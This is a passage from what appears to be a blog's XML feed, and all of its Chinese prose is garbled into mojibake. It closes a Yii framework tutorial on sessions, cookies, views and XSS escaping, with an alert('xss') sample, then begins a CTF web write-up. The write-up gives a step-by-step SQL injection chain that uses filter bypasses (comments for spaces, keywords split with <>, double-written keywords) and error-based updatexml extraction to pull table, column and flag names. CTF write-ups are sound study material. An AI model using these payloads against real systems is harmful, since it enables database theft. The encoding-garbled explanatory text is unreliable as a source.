class="code"><pre><span class="line"><span class="keyword">if</span>($session-&gt;isAcive)</span><br></pre></td></tr></table></figure><p>è€Œæ‰“å¼€sessionæˆ‘ä»¬å¯ä»¥ç”¨open()å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$session-&gt;open()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ—ä¸¾ä¸€ä¸‹sessionçš„å¢åˆ æ”¹æŸ¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$session-&gt;set(<span class="string">'user'</span>,<span class="string">'abcde'</span>); <span class="comment">//å¢è®¾ä¸€æ¡sessionæ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨PHPstudyé‡Œé¢çš„tmpç›®å½•ä¸‹å¤šäº†ä¸€æ¡sessionæ•°æ®</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/20/CgrVTf.png" alt="CgrVTf.png"><br>å¦‚æœæƒ³è·å–è¿™ä¸€æ¡sessioné‡Œé¢çš„æ•°æ®çš„è¯<br>æˆ‘ä»¬å¯ä»¥è¿™æ ·å»è°ƒç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$session-&gt;get(<span class="string">'user'</span>);<span class="comment">//åœ¨ç¼–è¯‘å™¨é‡Œé¢echoä¸€æ³¢ä»–å°±ä¼šå‡ºç°</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/20/CgrMlj.png" alt="CgrMlj.png"><br>å¦‚æœåˆ é™¤çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å»å®ç°</p><p><code>$session-&gt;remove(&#39;user&#39;);</code><br><img src="https://s1.ax1x.com/2018/05/20/Cgr3mq.png" alt="Cgr3mq.png"><br>å½“ç„¶ä¸Šé¢çš„åŠæ³•æ˜¯é€šè¿‡Yiiæ¡†æ¶é‡Œé¢çš„ç±»å»å®ç°çš„ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨æ•°ç»„æ–¹å¼å»è®¾ç½®ï¼Œä¾‹å¦‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$session[<span class="string">'user'</span>]=<span class="string">'abcde'</span>;</span><br><span class="line"><span class="keyword">echo</span> $session[<span class="string">'user'</span>];</span><br><span class="line"><span class="keyword">unset</span> ($session[<span class="string">'user'</span>]);</span><br></pre></td></tr></table></figure><p><code>æ³¨æ„</code><br>å¦‚æœæˆ‘ä»¬åœ¨å…¶ä»–æµè§ˆå™¨echoä¸€ä¸‹sessionçš„è¯ï¼Œä»–æ˜¯ä¸ä¼šå‡ºç°ä»»ä½•ä¸œè¥¿çš„ï¼ŒåŸå› æ˜¯ä»–ä¼šè¯†åˆ«sessioné‡Œé¢çš„æ–‡ä»¶åï¼Œè¿›è€ŒæŠŠé‡Œé¢çš„å†…å®¹æ‹¿å‡ºæ¥ï¼Œå¥½åƒæ˜¯ä¸åŒçš„æµè§ˆå™¨äº§ç”Ÿçš„sessionçš„æ–‡ä»¶åä¸ä¸€æ ·ã€‚ã€‚</p><h3 id="Cookieå¤„ç†"><a href="#Cookieå¤„ç†" class="headerlink" title="Cookieå¤„ç†"></a>Cookieå¤„ç†</h3><p>ä»<code>å“åº”</code>é‡Œé¢è·å–æ•°æ®å¹¶å¾€æµè§ˆå™¨é‡Œé¢å†™å…¥cookieæ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„è¯­å¥<br>é¦–å…ˆæˆ‘ä»¬å¾—ä»å…¨å±€ç±»Yiiä¸‹çš„åº”ç”¨ä¸»ä½“appä¸‹çš„responseè·å–å¯¹åº”çš„cookiesæ–¹æ³•<br>ä¹Ÿå°±æ˜¯<code>/YII::$app-&gt;response-&gt;cookies</code>;</p><p>æˆ‘ä»¬æ·»åŠ ä¸€ä¸ªcookiesä¿¡æ¯,å¯ä»¥è¿™æ ·å»å†™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cookies = \YII::$app-&gt;response-&gt;cookies;</span><br><span class="line">$cookie_data = <span class="keyword">array</span>(<span class="string">'name'</span>=&gt;<span class="string">'user'</span>,<span class="string">'value'</span>=&gt;<span class="string">'1232123'</span>);</span><br><span class="line">$cookies-&gt;add(<span class="keyword">new</span> Cookie($cookie_data));  <span class="comment">//æ³¨æ„è¿™é‡Œaddå‚æ•°é‡Œé¢æ˜¯ä¸€ä¸ªCookieå¯¹è±¡ï¼Œå¼•ç”¨è¿™æ ·çš„å¯¹è±¡æˆ‘ä»¬éœ€è¦åœ¨ä»£ç </span></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/Cgr800" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/Cgr800.md.png" alt="Cgr800.md.png"></a><br>çš„å‰é¢ä½¿ç”¨ä¸€ä¸ªå‘½åç©ºé—´<code>use yii\web\Cookie;</code><br>å¦‚æœæˆ‘ä»¬è¦ä¿®æ”¹æŸä¸€ä¸ªcookieçš„å€¼çš„è¯ï¼Œç›´æ¥æ”¹å˜valueçš„å€¼å³å¯ï¼Œä»–ä¼šè‡ªåŠ¨è¦†ç›–æ‰åŸæ¥çš„æ•°æ®<br>åˆ é™¤çš„è¯æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ç”¨<code>$cookies-&gt;remove(&#39;id&#39;); //é‡Œé¢æ˜¯cookieçš„åå­—</code></p><p>ä»<code>è¯·æ±‚</code>é‡Œé¢æ‹¿å‡ºcookieæ•°æ®ï¼Œæˆ‘ä»¬è¿™ä¸ªæ—¶å€™ä½¿ç”¨çš„æ˜¯appä¸‹çš„requestå¯¹åº”çš„cookiesæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cookies = \YII::$app-&gt;request-&gt;cookies;</span><br><span class="line">$cookies-&gt;getValue(<span class="string">'user'</span>);</span><br></pre></td></tr></table></figure><p>ä½†å¦‚æœä¸Šé¢çš„cookieä¸å­˜åœ¨çš„è¯ï¼Œä»–ä¼šè¿”å›ç¬¬äºŒä¸ªé»˜è®¤çš„å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cookie-&gt;getValue(&apos;users&apos;,24);</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/CgrttU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgrttU.md.png" alt="CgrttU.md.png"></a></p><p>cookieè¿™ä¸œè¥¿ä¸ºä»€ä¹ˆåœ¨æµè§ˆå™¨é‡Œé¢çœ‹æ¥æ˜¯ä¸€ä¸²æ··ä¹±çš„æ•°å­—å‘¢ï¼Œæ˜¯å› ä¸ºå®ƒç”¨äº†æˆ‘ä»¬ä¸Šé¢æ€»ç»“çš„åœ¨configç›®å½•ä¸‹çš„web.phpæ–‡ä»¶é‡Œé¢çš„cookiekeyåŠ å¯†çš„</p><h3 id="è§†å›¾çš„åˆ›å»º"><a href="#è§†å›¾çš„åˆ›å»º" class="headerlink" title="è§†å›¾çš„åˆ›å»º"></a>è§†å›¾çš„åˆ›å»º</h3><p>è¿‡å¤šçš„htmlæˆ–è€…jsä¼šç»™æˆ‘ä»¬å¸¦æ¥å†—ä½™çš„ä»£ç ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°Yiiæ¡†æ¶ç»™æˆ‘ä»¬å¸¦æ¥çš„ä¸€å¥—è§£å†³æ–¹æ¡ˆï¼Œå°±æ˜¯æŠŠä¸€äº›å‰ç«¯ä»£ç æ”¾åœ¨ä¸€ä¸ªå«viewsçš„æ–‡ä»¶å¤¹ä¸‹</p><p>æˆ‘è¿™é‡Œæ˜¯åœ¨viewsæ–‡ä»¶å¤¹ä¸‹æ–°å»ºäº†ä¸€ä¸ªhelloæ–‡ä»¶å¤¹å¯¹åº”ä¸Šé¢çš„helloæ§åˆ¶å™¨ï¼Œè€Œä¸”è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹å­˜åœ¨ä¸€ä¸ªåä¸ºindex.phpçš„æ–‡ä»¶ï¼Œé‡Œé¢å­˜æœ‰HTMLæ ¼å¼<br><img src="https://s1.ax1x.com/2018/05/20/CgrDn1.png" alt="CgrDn1.png"><br>ä¸€èˆ¬æˆ‘ä»¬æŠŠé‡Œé¢çš„æ–‡ä»¶ç§°ä¸ºè§†å›¾æ–‡ä»¶,è€ŒYiiæ¡†æ¶è§„å®šäº†æˆ‘ä»¬éœ€è¦åœ¨å¯¹åº”æ§åˆ¶å™¨åå­—çš„æ–‡ä»¶å¤¹ä¸‹å¯»æ‰¾å¯¹åº”çš„æ–‡ä»¶(æ–‡ä»¶å¤¹ä¸åŒºåˆ†å¤§å†™å°å¥½åƒ)</p><p><img src="https://s1.ax1x.com/2018/05/20/Cgr6AK.png" alt="Cgr6AK.png"><br>æˆ‘ä»¬åœ¨å¯¹åº”çš„æ§åˆ¶å™¨æ–‡ä»¶é‡Œé¢éœ€è¦è°ƒç”¨renderPartialå‡½æ•°ï¼Œä½†æ˜¯ç”±äºè¿™ä¸ªæ•°å±äºControllerç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è°ƒç”¨<br><code>return $this-&gt;renderPartial(&#39;viewsä¸‹å¯¹åº”çš„æ–‡ä»¶å/*ä¸ºäº†æ–¹ä¾¿ç®¡ç†Yiiæ¡†æ¶è§„å®šä¸è¦åç¼€å*/&#39;);</code><br>è€Œä¸”è¿™é‡Œçš„returnä¹Ÿæ˜¯æ˜¯Yiiæ¡†æ¶è§„å®šçš„ï¼Œè°ƒç”¨è§†å›¾åªèƒ½å¤Ÿè¿™æ ·å†™äº†</p><h3 id="è§†å›¾ä¼ é€æ•°æ®"><a href="#è§†å›¾ä¼ é€æ•°æ®" class="headerlink" title="è§†å›¾ä¼ é€æ•°æ®"></a>è§†å›¾ä¼ é€æ•°æ®</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ•°ç»„å»ä¼ é€’è§†å›¾è¦çš„æ•°æ®ï¼Œä¸»è¦æ­¥éª¤æ˜¯å…ˆåˆ›å»ºä¸€ä¸ªæ•°ç»„ï¼Œå†åˆ©ç”¨æ•°ç»„é‡Œé¢çš„keyå’Œvalue<br>ç„¶åå†åˆ©ç”¨renderPartialå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å»ä¼ å‚<br>è¿™é‡Œæ˜¯controlleré¡µé¢çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$hello_str= <span class="string">'Hello World'</span>;</span><br><span class="line">        $test_array = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//åˆ›å»ºæ•°ç»„</span></span><br><span class="line">        $data = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æŠŠéœ€è¦ä¼ ç»™è§†å›¾çš„å€¼æ”¾è¿›æ•°ç»„ä¸­</span></span><br><span class="line">        $data[<span class="string">'view_hellostr'</span>]=$hello_str;</span><br><span class="line">        $data[<span class="string">'view_array'</span>]=$test_array;</span><br><span class="line">        <span class="keyword">return</span>  <span class="keyword">$this</span>-&gt;renderPartial(<span class="string">'index'</span>,$data);</span><br></pre></td></tr></table></figure><p>åœ¨viewä¸‹çš„hello/index.phpä¸‹çš„ä»£ç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=$view_hellostr<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=$view_array[<span class="number">0</span>]<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æ˜¯åˆ©ç”¨äº†controlleré‡Œé¢æ•°ç»„çš„é”®å€¼ä½œä¸ºè¿™ä¸€ä¸ªé¡µé¢è¾“å‡ºçš„å˜é‡ï¼Œè®°å¾—å¸¦$ç¬¦å·ï¼Œæˆ‘å¥½å‡ æ¬¡éƒ½å¿˜è®°äº†ï¼Œè¿˜æœ‰çš„è¯æ•°ç»„è®°å¾—åŠ ä¸‹æ ‡ï¼Œä¸ç„¶ä¼šæŠ¥é”™çš„</p><p>å¦å¤–è¡¥å……ä¸€ä¸ªçŸ¥è¯†ç‚¹</p><p>è¿™é‡Œçš„åˆ©ç”¨äº†phpçš„çŸ­æ ‡ç­¾<br>åœ¨phpçš„é…ç½®æ–‡ä»¶ï¼ˆphp.iniï¼‰ä¸­æœ‰ä¸€ä¸ª<code>short_open_tag</code>çš„å€¼ï¼Œå¼€å¯ä»¥åå¯ä»¥ä½¿ç”¨PHPçš„çŸ­æ ‡ç­¾ï¼š<code>&lt;? ?&gt;</code><br>åŒæ—¶ï¼Œåªæœ‰å¼€å¯è¿™ä¸ªæ‰å¯ä»¥ä½¿ç”¨ <code>&lt;?=</code> ä»¥ä»£æ›¿ <code>&lt;? echo</code> ï¼Œ=è¡¨ç¤ºè¾“å‡ºï¼Œä¸è¿‡å»ºè®®ç”¨<code>&lt;?php ?&gt;</code></p><h3 id="è§†å›¾æ•°æ®çš„å®‰å…¨"><a href="#è§†å›¾æ•°æ®çš„å®‰å…¨" class="headerlink" title="è§†å›¾æ•°æ®çš„å®‰å…¨"></a>è§†å›¾æ•°æ®çš„å®‰å…¨</h3><p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªxsså®‰å…¨é—®é¢˜ï¼Œå­¦ä¹ è§†é¢‘å‘ç°è¿™é‡Œåº”è¯¥æ˜¯åå°„å‹xssï¼Œä¸»è¦åŸå› æ˜¯è¿‡æ»¤ä¸ä¸¥è°¨å¯¼è‡´çš„ã€‚ã€‚å¤ä¹ ä¸€æ³¢å®‰å…¨çŸ¥è¯†<br>ä¸‹é¢å°±æ˜¯å¦‚ä½•æ¥é˜²å¾¡çš„<br>æˆ‘ä»¬æŠŠä¸Šé¢ä»£ç çš„å˜é‡<code>$hello_str= &#39;Hello World&#39;;</code>æ”¹ä¸º<code>$hello_str= &#39;Hello World&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&#39;;</code><br>è¿™æ˜¯ä¸€ä¸ªå¼¹çª—ä»£ç ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥çš„æ˜¯è¿™æ ·çš„ï¼Œé‚£å°±ä¼šç›´æ¥å¼¹çª—ï¼Œä½“éªŒä¼šå¾ˆå·®<br>è§£å†³çš„åŠæ³•æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯ç¼–ç ä¸€ä¸‹ï¼Œå†è¾“å‡ºï¼Œå¦ä¸€ç§æ˜¯ç›´æ¥è¿‡æ»¤æ‰jsä»£ç <br>æˆ‘ä»¬åªéœ€è¦åœ¨viewé¡µé¢ä¸‹çš„hello/index.phpä¸‹çš„ä»£ç åšä¿®æ”¹ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦æå‰ä½¿ç”¨å®ƒä»¬çš„å‘½åç©ºé—´ï¼Œæ‰€ä»¥å‰é¢åŠ ä¸Š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">helpers</span>\<span class="title">Html</span>;     <span class="comment">//ç¬¬ä¸€ç§æ–¹æ³•çš„å‘½åç©ºé—´</span></span><br><span class="line"> <span class="keyword">use</span> <span class="title">yii</span>\<span class="title">helpers</span>\<span class="title">HtmlPurifier</span>;   <span class="comment">//ç¬¬äºŒç§æ–¹æ³•çš„å‘½åç©ºé—´</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;<span class="meta">&lt;?</span>=Html::encode($view_hellostr)<span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line">&lt;h1&gt;<span class="meta">&lt;?</span>=HtmlPurifier::process($view_hellostr)<span class="meta">?&gt;</span>&lt;/h1&gt;  <span class="comment">//åˆ©ç”¨äº†processçš„æ–¹æ³•</span></span><br></pre></td></tr></table></figure><p>é¡µé¢æ˜¾ç¤ºç»“æœå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello World&lt;script&gt;alert(&apos;xss&apos;);&lt;/script&gt;</span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure><h3 id="å¸ƒå±€æ–‡ä»¶"><a href="#å¸ƒå±€æ–‡ä»¶" class="headerlink" title="å¸ƒå±€æ–‡ä»¶"></a>å¸ƒå±€æ–‡ä»¶</h3><p>æœ‰æ—¶å€™å¤šä¸ªHTMLæ–‡ä»¶ä¼šå‡ºç°å†—ä½™çš„éƒ¨åˆ†ï¼Œç¨‹åºå‘˜ä¸å¸Œæœ›å‡ºç°è¿™ç§æƒ…å†µ<br>äºæ˜¯æˆ‘ä»¬å°±å‡ºç°äº†å¸ƒå±€æ–‡ä»¶æŠŠå†—ä½™çš„éƒ¨åˆ†æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸‹æ–¹ä¾¿è°ƒç”¨</p><p>ä¸€èˆ¬æˆ‘ä»¬ä¼šåœ¨viewsä¸‹é¢çš„layoutsæ–‡ä»¶å¤¹æ–°å»ºå¸ƒå±€æ–‡ä»¶<br>è¿™é‡Œæˆ‘åœ¨layoutsæ–‡ä»¶å¤¹ä¸‹åˆ›å»ºäº†ä¸€ä¸ªåå«common.phpçš„æ–‡ä»¶</p><p>æŠŠå…¬å…±éƒ¨åˆ†çš„ä»£ç æ”¾åœ¨commonæ–‡ä»¶ä¸‹</p><p>å›åˆ°controllerçš„æ–‡ä»¶ä¸‹ï¼Œè¿™æ—¶å€™æˆ‘ä»¬ä¸èƒ½å†ä½¿ç”¨<code>renderPartial</code>è¿™ä¸ªå‡½æ•°äº†ï¼Œåº”è¯¥ç”¨<code>render</code>è¿™ä¸ªå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯¥ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'index'</span>);  <span class="comment">//è¿™é‡Œçš„ä»£ç çš„ä½œç”¨æ˜¯å…ˆæŠŠindexè§†å›¾é‡Œé¢çš„å†…å®¹æ”¾åˆ°ä¸€ä¸ªå«$contentçš„å˜é‡é‡Œé¢ï¼Œè€Œä¸”ä¼šæŠŠå¸ƒå±€æ–‡ä»¶é‡Œé¢çš„å†…å®¹æ˜¾ç¤ºå‡ºæ¥</span></span><br></pre></td></tr></table></figure><p>ä½†åŒæ—¶æˆ‘ä»¬ä¹Ÿè¦æŒ‡å®šå¸ƒå±€æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å¯¹åº”çš„ç±»ä¸‹é¢è€Œä¸æ˜¯æ§åˆ¶å™¨é‡Œé¢å»å®šä¹‰<code>public $layout=&#39;å¸ƒå±€æ–‡ä»¶åå­—&#39;</code></p><p>ç„¶åæˆ‘ä»¬åœ¨common.phpé‡Œé¢å»æ·»åŠ <code>&lt;?=$content?&gt;</code><br>ä¸‹é¢æ˜¯æˆ‘comon.phpé‡Œé¢çš„ä»£ç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">content</span>=<span class="string">"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="php"><span class="meta">&lt;?</span>=$content<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="è§†å›¾é‡Œé¢æ˜¾ç¤ºè§†å›¾"><a href="#è§†å›¾é‡Œé¢æ˜¾ç¤ºè§†å›¾" class="headerlink" title="è§†å›¾é‡Œé¢æ˜¾ç¤ºè§†å›¾"></a>è§†å›¾é‡Œé¢æ˜¾ç¤ºè§†å›¾</h3><p>åœ¨viewsæ–‡ä»¶å¤¹ä¸‹çš„helloä¸‹é¢å†å»ºç«‹ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯index.phpä¸€ä¸ªæ˜¯about.php æˆ‘ä»¬è¦æƒ³åœ¨index.phpé‡Œé¢æ˜¾ç¤ºabout.phpé‡Œé¢çš„å†…å®¹çš„è¯ï¼Œéœ€è¦åœ¨index.phpé‡Œé¢åŠ ä¸Š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'about'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬éœ€è¦å¾€abouté¡µé¢é‡Œé¢ä¼ è¿›å‚æ•°çš„è¯ï¼Œè¿™æ—¶å€™æˆ‘ä»¬éœ€è¦çš„æ˜¯è¿™é‡Œçš„renderå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°<br>ä½†è¿™ç¬¬äºŒä¸ªå‚æ•°å¿…é¡»æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'about'</span>,<span class="keyword">array</span>(<span class="string">'view_hello'</span>=&gt;<span class="string">'Hello about 2'</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬è¿˜éœ€è¦æŠŠä¼ è¿›çš„å‚æ•°åœ¨abouté¡µé¢ä¸Šæ˜¾ç¤ºçš„è¯<br>æˆ‘ä»¬è¦åœ¨abouté¡µé¢ä¸‹æ·»åŠ <br><code>&lt;?=$view_hello?&gt;</code> ç›´æ¥æŠŠæ•°ç»„çš„é”®å€¼å½“æˆå˜é‡ååœ¨abouté¡µé¢è¾“å‡ºå³å¯</p>]]></content>
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> ç¼–ç¨‹è¯­è¨€ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WhaleCTFç¬¬ä¸€æœŸæ‰“å¡çš„å‡ ä¸ªwebé¢˜ç›®</title>
      <link href="/whalectf-web1.html"/>
      <url>/whalectf-web1.html</url>
      <content type="html"><![CDATA[<p>åˆå‘ç°ä¸€ä¸ªå¾ˆå¥½çš„å¹³å°å°è¯•åšä¸€ä¸‹<br><a id="more"></a></p><h2 id="çœŸçš„æ³¨å…¥"><a href="#çœŸçš„æ³¨å…¥" class="headerlink" title="çœŸçš„æ³¨å…¥"></a>çœŸçš„æ³¨å…¥</h2><p>å…ˆè¾“å…¥â€™å‘ç°æœ‰æŠ¥é”™ï¼Œåº”è¯¥å­˜åœ¨æ³¨å…¥<br>ç„¶åå°è¯•<br><code>1&#39; or &#39;1&#39;=&#39;1</code>å‘ç°è¢«è¿‡æ»¤äº†<br><!--more--><br>ç„¶åç»§ç»­å°è¯•å‘ç°<code>ç©ºæ ¼ï¼Œunionï¼Œor,and</code>è¢«è¿‡æ»¤äº†ï¼Œå½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ç”¨bpçš„çˆ†ç ´åŠŸèƒ½å»æµ‹è¯•ï¼Œè¿˜æ˜¯å¾ˆå¥½ç”¨çš„<br>ç„¶åè¿™é¢˜è¿˜æœ‰ä¸€ä¸ªå‘å°±æ˜¯xssçš„æç¤ºï¼Œè¾“å…¥<code>&lt;&gt;</code>å‘ç°è¢«è¿‡æ»¤ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½å¤Ÿåˆ©ç”¨è¿™ä¸€ç‚¹å»æ„é€ payload<br>è€Œç©ºæ ¼æˆ‘ä»¬å¯ä»¥ç”¨<code>/**/</code>æ¥ç»•è¿‡<br>ä¸‹é¢æ˜¯æˆ‘çš„æ³¨å…¥è¿‡ç¨‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1&apos;/**/o&lt;&gt;r/**/1=1#</span><br><span class="line">1&apos;/**/o&lt;&gt;rder/**/by/**/3#</span><br><span class="line">-1&apos;/**/un&lt;&gt;ion/**/sel&lt;&gt;ect/**/1,2,3# å‘ç°æ²¡æœ‰å›æ˜¾ï¼Œåªèƒ½å°è¯•æŠ¥é”™æ³¨å…¥æˆ–è€…ç›²æ³¨äº†ï¼Œä½†ç›²æ³¨å†™è„šæœ¬å¤ªéº»çƒ¦æˆ‘ä»¬å°è¯•æŠ¥é”™æ³¨å…¥</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/database())),1)# å‘ç°æ•°æ®åº“ï¼Œä¸‹é¢å°±æ˜¯å¸¸è§„æ“ä½œäº†</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/table_name/**/from/**/info&lt;&gt;rmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),0x7e),1)#å‘ç°è¡¨åflag_0d9aï¼Œå…¶å®è¿™é‡Œä¹Ÿå¯ä»¥ç”¨group_concatï¼Œæ²¡è¢«è¿‡æ»¤</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/coulmn_name/**/from/**/info&lt;&gt;rmation_schema.columns/**/where/**/table_name=&apos;flag_0d9a&apos;/**/limit/**/0,1),0x7e),1)#</span><br><span class="line">è¿™é‡Œçªç„¶å‘ç°columnè¢«è¿‡æ»¤æ‰äº†ï¼Œåªèƒ½åŒå†™ç»•è¿‡äº†</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/colcolumnsumn_name/**/from/**/info&lt;&gt;rmation_schema.colcolumnsumns/**/where/**/table_name=&apos;flag_0d9a&apos;/**/limit/**/0,1),0x7e),1)#å‘ç°åˆ—åflag</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/flag/**/from/**/flag_0d9a),0x7e),1)# å¾—åˆ°flag</span><br></pre></td></tr></table></figure><p>è¿™ä¸€é¢˜åˆå†ä¸€æ¬¡å¤ä¹ äº†ç”¨&lt;&gt;è¿˜æœ‰åŒå†™ç»•è¿‡çš„æŠ€å·§</p><h2 